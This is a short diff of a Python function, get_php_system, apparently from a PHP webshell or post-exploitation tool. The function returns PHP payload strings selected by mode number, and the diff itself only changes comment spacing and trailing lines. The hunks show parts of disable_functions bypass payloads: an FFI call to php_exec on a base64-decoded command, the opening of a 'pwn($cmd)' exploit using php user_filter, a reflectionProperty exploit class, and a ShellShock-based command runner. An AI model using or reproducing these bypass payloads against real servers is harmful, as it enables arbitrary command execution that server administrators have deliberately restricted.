             }
         """
-    if bdf_mode == 13: # FFI-php_exec
+    if bdf_mode == 13:  # FFI-php_exec
         return """
             $f=FFI::cdef("int php_exec(int type, char *cmd);");
             ob_start();$f->php_exec(3,base64_decode("%s"));$o=ob_get_contents();ob_end_clean();
             %s"""
-    if bdf_mode == 14: # php7-reflectionProperty
+    if bdf_mode == 14:  # php7-reflectionProperty
         return """global $abc, $helper;
                 class Test {
                 public HelperHelperHelperHelperHelperHelperHelper $prop;
@@ -1295,7 +1295,7 @@ def get_php_system(bdf_mode):
                 $o=ob_get_contents();
                 ob_end_clean();
         %s"""
-    if bdf_mode == 15: # php-user_filter
+    if bdf_mode == 15:  # php-user_filter
         return """
         function pwn($cmd) {
             define('LOGGING', false);
@@ -1478,7 +1478,7 @@ def get_php_system(bdf_mode):
         ob_end_clean();
         %s
         """
-    if bdf_mode == 16: # ShellShock
+    if bdf_mode == 16:  # ShellShock
         return """
             function shellshock($cmd) {
                 if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
@@ -1495,6 +1495,3 @@ def get_php_system(bdf_mode):
             ob_end_clean();
             %s
         """
-
-
-
